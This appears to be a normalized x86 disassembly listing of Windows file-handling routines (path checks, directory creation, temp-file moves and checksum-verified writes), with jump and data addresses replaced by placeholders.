sub_401000
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push 0x0
lea eax [ ebp + 0x8 ]
push eax
call sub_401040
add esp 0x8
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0xc ] eax
mov edx [ ebp - 0x4 ]
cmp [ edx + 0xc ] 0x0
jne r-xdata
xor eax eax
mov eax 0x5
jmp r-xdata
mov esp ebp
pop ebp
retn 0x4
sub_401040
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
push eax
push r--data
call sub_4011d0
add esp 0x8
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx eax [ edx ]
cmp eax 0x2f
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0xc
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x4 ]
movzx eax [ edx ]
cmp eax 0x5c
je r-xdata
mov ecx [ ebp - 0x4 ]
push ecx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0xc
xor eax eax
jmp r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
push eax
push r--data
call sub_401190
push eax
call sub_408470
add esp 0xc
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
movzx edx [ ecx + 0x2 ]
cmp edx 0x3a
jne r-xdata
movzx ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
push r--data
mov edx [ ebp - 0x4 ]
push edx
call sub_401170
add esp 0x8
test eax eax
je r-xdata
mov edx [ ebp - 0x4 ]
push edx
call sub_411794
add esp 0x4
mov ecx [ ebp - 0x4 ]
movzx edx [ ecx + eax * 2 - 0x2 ]
cmp edx 0x2f
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
push eax
push r--data
call sub_401190
push eax
call sub_408470
add esp 0xc
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
push ecx
call sub_411794
add esp 0x4
xor edx edx
mov ecx [ ebp - 0x4 ]
mov [ ecx + eax * 2 - 0x2 ] dx
mov eax [ ebp - 0x4 ]
push eax
push r--data
call sub_401190
push eax
call sub_408470
add esp 0xc
xor eax eax
jmp r-xdata
sub_401190
push ebp
mov ebp esp
mov eax [ rw-data ]
and eax 0x1
jne r-xdata
mov eax rw-data
pop ebp
retn
mov ecx [ rw-data ]
or ecx 0x1
mov [ rw-data ] ecx
mov ecx rw-data
call sub_4069f0
push sub_426fd0
call sub_411936
add esp 0x4
sub_4011d0
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
movzx eax [ edx ]
test eax eax
jne r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0xc ]
movzx eax [ edx ]
test eax eax
je r-xdata
mov eax [ ebp - 0xc ]
movzx ecx [ eax ]
test ecx ecx
jne r-xdata
mov ecx [ ebp - 0x8 ]
movzx edx [ ecx ]
mov eax [ ebp - 0xc ]
movzx ecx [ eax ]
cmp edx ecx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
movzx eax [ edx ]
test eax eax
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
add edx 0x2
mov [ ebp - 0x8 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x8 ]
mov [ ecx ] edx
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
add ecx 0x2
mov [ ebp - 0xc ] ecx
mov eax [ ebp - 0xc ]
movzx ecx [ eax ]
test ecx ecx
je r-xdata
mov edx [ ebp - 0x4 ]
add edx 0x2
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
movzx ecx [ eax ]
test ecx ecx
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx eax [ edx ]
mov ecx [ ebp - 0xc ]
movzx edx [ ecx ]
cmp eax edx
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0xc ] ecx
jmp r-xdata
mov edx [ ebp + 0xc ]
mov [ edx ] 0x0
mov eax [ ebp - 0x8 ]
jmp r-xdata
xor eax eax
mov ecx [ ebp - 0x4 ]
mov [ ecx ] ax
mov edx [ ebp - 0x4 ]
add edx 0x2
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
mov eax [ ebp - 0x8 ]
jmp r-xdata
mov edx [ ebp - 0xc ]
add edx 0x2
mov [ ebp - 0xc ] edx
sub_4012d0
push ebp
mov ebp esp
sub esp 0x3c
mov [ ebp - 0x3c ] ecx
push 0x0
mov eax [ ebp - 0x3c ]
mov ecx [ eax + 0xc ]
push ecx
call sub_411f69
add esp 0x8
mov [ ebp - 0x34 ] eax
cmp [ ebp - 0x34 ] 0x0
je r-xdata
mov ecx [ ebp - 0x3c ]
mov edx [ ecx + 0xc ]
push edx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0xc
lea eax [ ebp - 0x30 ]
push eax
mov ecx [ ebp - 0x3c ]
mov edx [ ecx + 0xc ]
push edx
call sub_411b05
add esp 0x8
mov [ ebp - 0x34 ] eax
cmp [ ebp - 0x34 ] 0x0
je r-xdata
mov edx [ ebp - 0x3c ]
mov [ edx + 0x10 ] 0x1
mov eax [ ebp - 0x3c ]
mov [ eax + 0x4 ] 0x0
xor eax eax
jmp r-xdata
movzx eax [ ebp - 0x2a ]
and eax 0xf000
cmp eax 0x8000
je r-xdata
call sub_4119bb
mov eax [ eax ]
push eax
mov ecx [ ebp - 0x3c ]
mov edx [ ecx + 0xc ]
push edx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x10
mov eax 0x6
jmp r-xdata
mov esp ebp
pop ebp
retn
push 0x2f
mov eax [ ebp - 0x3c ]
mov ecx [ eax + 0xc ]
push ecx
call sub_41194d
add esp 0x8
mov [ ebp - 0x38 ] eax
cmp [ ebp - 0x38 ] 0x0
je r-xdata
mov ecx [ ebp - 0x3c ]
mov edx [ ecx + 0xc ]
push edx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0xc
mov eax 0x2a
jmp r-xdata
push 0x2
push r--data
call sub_411f69
add esp 0x8
mov [ ebp - 0x34 ] eax
xor edx edx
mov eax [ ebp - 0x38 ]
mov [ eax ] dx
push 0x2
mov ecx [ ebp - 0x3c ]
mov edx [ ecx + 0xc ]
push edx
call sub_411f69
add esp 0x8
mov [ ebp - 0x34 ] eax
mov eax 0x2f
mov ecx [ ebp - 0x38 ]
mov [ ecx ] ax
jmp r-xdata
xor eax eax
call sub_4119bb
mov edx [ eax ]
push edx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0xc
mov eax 0x7
jmp r-xdata
cmp [ ebp - 0x34 ] 0x0
je r-xdata
sub_401430
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x10 ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0xc ]
push edx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0xc
push 0x0
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0xc ]
push ecx
call sub_411f69
add esp 0x8
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0xc ]
push ecx
call sub_4014e0
add esp 0x4
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x8
mov edx [ ebp - 0x8 ]
mov [ edx + 0x10 ] 0x1
xor eax eax
jmp r-xdata
mov esp ebp
pop ebp
retn
xor eax eax
mov edx [ ebp - 0x4 ]
push edx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0xc
mov eax [ ebp - 0x4 ]
jmp r-xdata
sub_4014e0
push ebp
mov ebp esp
sub esp 0x210
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
push r--data
push 0x104
lea ecx [ ebp - 0x210 ]
push ecx
call sub_401540
add esp 0x10
push 0x0
lea edx [ ebp - 0x210 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_401590
add esp 0xc
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_411f81
mov esp ebp
pop ebp
retn
sub_401540
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0xc ]
sub eax 0x1
mov [ ebp - 0x4 ] eax
lea ecx [ ebp + 0x14 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0xc ]
push edx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
sub ecx 0x1
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_412064
add esp 0x10
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] 0x0
xor eax eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 2 ] ax
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_401590
push ebp
mov ebp esp
sub esp 0x38
mov eax [ ebp + 0xc ]
push eax
call sub_401760
add esp 0x4
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea ecx [ ebp - 0x38 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_411b05
add esp 0x8
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
movzx edx [ ebp - 0x32 ]
and edx 0xf000
cmp edx 0x8000
je r-xdata
call sub_4119bb
mov eax [ eax ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x10
mov eax 0x6
jmp r-xdata
mov esp ebp
pop ebp
retn
push 0x0
mov ecx [ ebp + 0xc ]
push ecx
call sub_411f69
add esp 0x8
test eax eax
jne r-xdata
movzx eax [ ebp + 0x10 ]
test eax eax
je r-xdata
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_412081
add esp 0x8
test eax eax
je r-xdata
mov edx [ ebp + 0xc ]
push edx
call sub_4016f0
add esp 0x4
test eax eax
je r-xdata
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x8
movzx ecx [ ebp - 0x32 ]
and ecx 0xf000
cmp ecx 0x4000
je r-xdata
xor eax eax
call sub_4119bb
mov eax [ eax ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x14
mov eax 0x7
jmp r-xdata
mov eax [ ebp + 0xc ]
push eax
push r--data
call sub_401190
push eax
call sub_408470
add esp 0xc
mov eax 0x7
jmp r-xdata
call sub_4119bb
mov edx [ eax ]
push edx
mov eax [ ebp + 0x8 ]
push eax
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x10
mov eax 0x2a
jmp r-xdata
sub_4016f0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_401740
add esp 0x4
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4120b4
add esp 0x4
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
call sub_4119bb
mov edx [ eax ]
push edx
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x14
sub_401760
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] 0x0
push 0x2f
mov eax [ ebp + 0x8 ]
push eax
call sub_41194d
add esp 0x8
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov [ edx ] cx
mov eax [ ebp + 0x8 ]
push eax
call sub_401760
add esp 0x4
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax 0x2f
mov ecx [ ebp - 0x8 ]
mov [ ecx ] ax
mov ecx [ ebp + 0x8 ]
movzx edx [ ecx ]
test edx edx
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_412153
add esp 0x4
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jge r-xdata
mov [ ebp - 0x4 ] 0x0
call sub_4119bb
cmp [ eax ] 0x11
je r-xdata
call sub_4119bb
mov ecx [ eax ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x10
mov [ ebp - 0x4 ] 0x7
jmp r-xdata
sub_401810
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0xc ]
push edx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0xc
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0xc ]
push edx
call sub_401860
add esp 0x8
jmp r-xdata
mov esp ebp
pop ebp
retn 0x4
sub_401860
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_401890
add esp 0x4
mov eax [ ebp + 0x8 ]
push eax
call sub_401920
add esp 0x4
jmp r-xdata
pop ebp
retn
sub_401890
push ebp
mov ebp esp
sub esp 0x210
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
push r--data
push 0x104
lea ecx [ ebp - 0x210 ]
push ecx
call sub_401540
add esp 0x10
push 0x0
lea edx [ ebp - 0x210 ]
push edx
call sub_411f69
add esp 0x8
test eax eax
je r-xdata
push 0x0
mov ecx [ ebp + 0x8 ]
push ecx
lea edx [ ebp - 0x210 ]
push edx
call sub_401590
add esp 0xc
lea eax [ ebp - 0x210 ]
push eax
push r--data
call sub_401190
push eax
call sub_408470
add esp 0xc
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_411f81
mov esp ebp
pop ebp
retn
sub_401920
push ebp
mov ebp esp
sub esp 0x420
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
push r--data
push 0x104
lea ecx [ ebp - 0x210 ]
push ecx
call sub_401540
add esp 0x10
push 0x0
lea edx [ ebp - 0x210 ]
push edx
call sub_411f69
add esp 0x8
test eax eax
je r-xdata
lea eax [ ebp - 0x210 ]
push eax
call sub_4016f0
add esp 0x4
mov [ ebp - 0x214 ] eax
cmp [ ebp - 0x214 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
movzx ecx [ rw-data ]
test ecx ecx
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_411f81
mov esp ebp
pop ebp
retn
movzx edx [ rw-data ]
test edx edx
jne r-xdata
lea eax [ ebp - 0x210 ]
push eax
push r--data
call sub_401190
push eax
call sub_408470
add esp 0xc
lea ecx [ ebp - 0x420 ]
push ecx
push 0x0
push r--data
push r--data
call [ GetTempFileNameW@IAT ]
push 0x0
lea edx [ ebp - 0x420 ]
push edx
lea eax [ ebp - 0x210 ]
push eax
call sub_401590
add esp 0xc
test eax eax
je r-xdata
push 0x4
push 0x0
lea eax [ ebp - 0x420 ]
push eax
call [ MoveFileExW@IAT ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x420 ]
push ecx
lea edx [ ebp - 0x210 ]
push edx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x10
mov eax 0x7
jmp r-xdata
lea edx [ ebp - 0x420 ]
push edx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0xc
lea ecx [ ebp - 0x420 ]
push ecx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0xc
jmp r-xdata
sub_401a80
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push 0x1
lea eax [ ebp + 0x8 ]
push eax
call sub_401040
add esp 0x8
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0xc ] eax
mov edx [ ebp - 0x4 ]
cmp [ edx + 0xc ] 0x0
jne r-xdata
xor eax eax
mov eax 0x5
jmp r-xdata
mov esp ebp
pop ebp
retn 0x4
sub_401ac0
push ebp
mov ebp esp
sub esp 0x38
mov [ ebp - 0x38 ] ecx
push 0x0
mov eax [ ebp - 0x38 ]
mov ecx [ eax + 0xc ]
push ecx
call sub_411f69
add esp 0x8
mov [ ebp - 0x34 ] eax
cmp [ ebp - 0x34 ] 0x0
je r-xdata
mov ecx [ ebp - 0x38 ]
mov edx [ ecx + 0xc ]
push edx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0xc
lea eax [ ebp - 0x30 ]
push eax
mov ecx [ ebp - 0x38 ]
mov edx [ ecx + 0xc ]
push edx
call sub_411b05
add esp 0x8
mov [ ebp - 0x34 ] eax
cmp [ ebp - 0x34 ] 0x0
je r-xdata
mov edx [ ebp - 0x38 ]
mov [ edx + 0x10 ] 0x1
mov eax [ ebp - 0x38 ]
mov [ eax + 0x4 ] 0x0
xor eax eax
jmp r-xdata
movzx eax [ ebp - 0x2a ]
and eax 0xf000
cmp eax 0x4000
je r-xdata
call sub_4119bb
mov eax [ eax ]
push eax
mov ecx [ ebp - 0x38 ]
mov edx [ ecx + 0xc ]
push edx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x10
mov eax 0x6
jmp r-xdata
mov esp ebp
pop ebp
retn
push 0x2
mov eax [ ebp - 0x38 ]
mov ecx [ eax + 0xc ]
push ecx
call sub_411f69
add esp 0x8
mov [ ebp - 0x34 ] eax
cmp [ ebp - 0x34 ] 0x0
je r-xdata
mov ecx [ ebp - 0x38 ]
mov edx [ ecx + 0xc ]
push edx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0xc
mov eax 0x2a
jmp r-xdata
xor eax eax
call sub_4119bb
mov edx [ eax ]
push edx
mov eax [ ebp - 0x34 ]
push eax
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x10
mov eax 0x7
jmp r-xdata
sub_401be0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x10 ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0xc ]
push edx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0xc
push 0x0
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0xc ]
push ecx
call sub_411f69
add esp 0x8
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x8
mov edx [ ebp - 0x8 ]
mov [ edx + 0x10 ] 0x1
mov esp ebp
pop ebp
retn
sub_401c50
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0xc ]
push edx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0xc
push 0x0
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0xc ]
push ecx
call sub_411f69
add esp 0x8
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x8
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ edx + 0xc ]
push eax
call sub_412185
add esp 0x4
test eax eax
je r-xdata
call sub_4119bb
mov ecx [ eax ]
push ecx
mov edx [ ebp - 0x4 ]
push edx
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0xc ]
push ecx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x14
sub_401d00
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0xc ]
push ecx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0xc
xor eax eax
mov esp ebp
pop ebp
retn
sub_401d30
push ebp
mov ebp esp
sub esp 0x118
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x118 ] ecx
mov eax [ ebp - 0x118 ]
mov ecx [ eax + 0xc ]
push ecx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0xc
push 0x0
mov edx [ ebp - 0x118 ]
mov eax [ edx + 0xc ]
push eax
call sub_411f69
add esp 0x8
mov [ ebp - 0x114 ] eax
cmp [ ebp - 0x114 ] 0x0
jne r-xdata
mov eax [ ebp - 0x118 ]
mov ecx [ eax + 0xc ]
push ecx
call sub_401760
add esp 0x4
mov [ ebp - 0x114 ] eax
cmp [ ebp - 0x114 ] 0x0
je r-xdata
mov ecx [ ebp - 0x118 ]
mov edx [ ecx + 0xc ]
push edx
call sub_4014e0
add esp 0x4
mov [ ebp - 0x114 ] eax
cmp [ ebp - 0x114 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x104
lea edx [ ebp - 0x110 ]
push edx
push 0xffffffff
mov eax [ ebp - 0x118 ]
mov ecx [ eax + 0xc ]
push ecx
push 0x0
push 0xfde9
call [ WideCharToMultiByte@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x114 ]
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x114 ]
jmp r-xdata
mov edx [ ebp - 0x118 ]
mov eax [ edx + 0xc ]
push eax
lea ecx [ ebp - 0x110 ]
push ecx
mov ecx rw-data
call sub_407690
mov [ ebp - 0x114 ] eax
cmp [ ebp - 0x114 ] 0x0
jne r-xdata
call [ GetLastError@IAT ]
push eax
push r--data
call sub_401190
push eax
call sub_408470
add esp 0xc
mov eax 0x10
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_411f81
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x114 ]
mov edx [ ebp - 0x118 ]
mov [ edx + 0x10 ] 0x1
sub_401e80
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0xc ]
push ecx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0xc
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0xc ]
push edx
call sub_401860
add esp 0x8
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x4 ]
movzx eax [ edx + 0x10 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0xc ]
push edx
call sub_4120b4
add esp 0x4
sub_401ee0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] r--data
mov ecx [ ebp - 0x4 ]
movzx edx [ ecx + 0x3c ]
test edx edx
je r-xdata
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x38 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x3c
push eax
call sub_4120b4
add esp 0x4
mov ecx [ ebp - 0x4 ]
call sub_401f30
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x38 ]
push eax
call sub_4121b5
add esp 0x4
sub_401f50
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_401f30
mov eax [ ebp + 0x8 ]
and eax 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
push ecx
call sub_41226d
add esp 0x4
sub_401f80
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_401ee0
mov eax [ ebp + 0x8 ]
and eax 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
push ecx
call sub_41226d
add esp 0x4
sub_401fb0
push ebp
mov ebp esp
sub esp 0x4c
mov [ ebp - 0x4c ] ecx
lea eax [ ebp - 0x40 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_41b3c1
add esp 0x4
push eax
call sub_402140
add esp 0x8
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edx [ ebp - 0x4c ]
mov eax [ ebp - 0x2c ]
cmp eax [ edx + 0x20 ]
je r-xdata
call sub_4119bb
mov edx [ eax ]
push edx
mov eax [ ebp - 0x4c ]
mov ecx [ eax + 0x10 ]
push ecx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x10
mov eax 0x6
jmp r-xdata
mov ecx [ ebp - 0x4c ]
mov edx [ ecx + 0x20 ]
push edx
call sub_412584
add esp 0x4
mov ecx [ ebp - 0x4c ]
mov [ ecx + 0x38 ] eax
mov edx [ ebp - 0x4c ]
cmp [ edx + 0x38 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4c ]
mov edx [ ecx + 0x20 ]
push edx
mov eax [ ebp - 0x2c ]
push eax
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x10
mov eax 0x2a
jmp r-xdata
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4c ]
mov ecx [ eax + 0x20 ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x4c ]
mov eax [ edx + 0x38 ]
mov [ ebp - 0xc ] eax
mov eax 0xd
jmp r-xdata
mov ecx [ ebp - 0x4c ]
mov edx [ ecx + 0x20 ]
push edx
mov eax [ ebp - 0x4c ]
mov ecx [ eax + 0x38 ]
push ecx
call sub_402160
add esp 0x8
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4c ]
mov eax [ ebp - 0x4 ]
cmp eax [ edx + 0x24 ]
je r-xdata
mov ecx [ ebp - 0x10 ]
push ecx
push 0x7fffffff
call sub_4021c0
add esp 0x8
mov [ ebp - 0x44 ] eax
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp - 0x44 ]
push eax
push 0x1
mov ecx [ ebp - 0xc ]
push ecx
call sub_412518
add esp 0x10
mov [ ebp - 0x48 ] eax
mov edx [ ebp - 0x48 ]
cmp edx [ ebp - 0x44 ]
je r-xdata
xor eax eax
mov ecx [ ebp - 0x4c ]
mov edx [ ecx + 0x24 ]
push edx
mov eax [ ebp - 0x4 ]
push eax
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x10
mov eax 0x4
jmp r-xdata
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x48 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x48 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4c ]
mov ecx [ eax + 0x10 ]
push ecx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0xc
mov eax 0x6
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
sub_402160
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0x8 ]
add eax [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov edx [ ebp + 0x8 ]
cmp edx [ ebp - 0x8 ]
je r-xdata
mov eax [ ebp - 0x4 ]
not eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
shl eax 0x8
mov ecx [ ebp - 0x4 ]
shr ecx 0x18
mov edx [ ebp + 0x8 ]
movzx edx [ edx ]
xor ecx edx
xor eax [ ecx * 4 + rw-data ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
add ecx 0x1
mov [ ebp + 0x8 ] ecx
sub_4021c0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
cmp eax [ ebp + 0xc ]
jbe r-xdata
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x4 ] ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_4021f0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
lea eax [ ebp + 0x8 ]
push eax
push r--data
call sub_4011d0
add esp 0x8
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0xc ] eax
mov edx [ ebp - 0x8 ]
cmp [ edx + 0xc ] 0x0
jne r-xdata
lea eax [ ebp + 0x8 ]
push eax
push r--data
call sub_4011d0
add esp 0x8
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
